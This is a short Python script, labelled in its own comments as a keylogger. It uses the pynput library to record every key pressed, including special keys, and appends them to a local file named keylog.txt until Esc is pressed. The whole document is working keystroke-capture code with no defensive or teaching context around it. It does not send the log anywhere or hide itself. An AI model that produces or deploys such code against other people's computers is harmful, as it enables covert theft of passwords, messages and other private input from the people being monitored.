import pynput
from pynput.keyboard import Key, Listener

# Specify the log file path
log_file = 'keylog.txt'

def on_press(key):
    try:
        with open(log_file, 'a') as log:
            log.write(f'{key.char}')
    except AttributeError:
        with open(log_file, 'a') as log:
            log.write(f'[{key.name}]')

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

def main():
    # Start the keylogger
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
